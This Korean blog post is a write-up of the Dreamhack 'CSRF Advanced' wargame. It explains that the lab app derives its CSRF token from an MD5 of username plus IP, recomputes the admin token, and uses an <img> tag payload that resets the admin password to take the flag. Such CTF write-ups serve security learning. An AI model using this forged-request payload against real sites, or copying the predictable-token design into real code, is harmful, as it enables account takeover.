---
layout: post
title: "[Dreamhack] CSRF Advanced 문제풀이"
date: 2023-11-03
categories: "web-hacking"
---

본 문제는 생각보다 어려웠습니다 ㅠ  
`CSRF Token`이 코드 상에서 어떻게 생성되는지 안다면 생각보다 쉽게 접근할 수 있고 기본적인 기능들이 어떻게 동작하는지 안다면 쉽게 접근할 수 있습니다.

**우리의 최종 목적지는 어드민 계정에 로그인을 하면 성공적으로 플래그를 획득할 수 있습니다.**

로그인 시, `CSRF Token`을 생성하게 됩니다. 토큰이 있어야지만 비밀번호를 생성할 수 있습니다.
```py
if pw == password:
    resp = make_response(redirect(url_for('index')) )
    session_id = os.urandom(8).hex()
    session_storage[session_id] = username
    token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
    resp.set_cookie('sessionid', session_id)
    return resp 
```

```py
@app.route("/change_password")
def change_password():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
        csrf_token = token_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')
    pw = request.args.get("pw", None)
    if pw == None:
        return render_template('change_password.html', csrf_token=csrf_token)
    else:
        if csrf_token != request.args.get("csrftoken", ""):
            return '<script>alert("wrong csrf token");history.go(-1);</script>'
        users[username] = pw
        return '<script>alert("Done");history.go(-1);</script>'
```
비밀번호 변경 시에도 `csrf_token`이 필요하다는 점을 알 수 있습니다.

```py
token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
```

가장 중요한 부분은 바로 위 코드입니다. `csrf_token`은 위의 방식을 통해서 저장된다는 점을 발견할 수 있습니다.  
그럼 본격적으로 어떻게 토큰이 발행되는지 확인하기 위해서 간단한 코드를 작성하여 확인해 보았습니다.

```py
from hashlib import md5

username = "admin"
remote_addr = "127.0.0.1"

print(md5((username + remote_addr).encode()).hexdigest())
```

`remote_addr`는 로컬 호스트로 지정해 주었습니다.

```
7505b9c72ab4aa94b1a4ed7b207b67fb
```

최종적으로 익스플로잇 코드는 `<img>` 태그를 통해서 설정할 수 있습니다.

```html
<img src="/change_password?pw=1234&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
```

어드민 계정의 비밀번호를 `1234`로 지정해 주었습니다.
이를 통해서 어드민 계정에 로그인하여 플래그를 얻을 수 있습니다.

![00](/hacking/assets/images/dreamhack/csrf-advanced/00.png)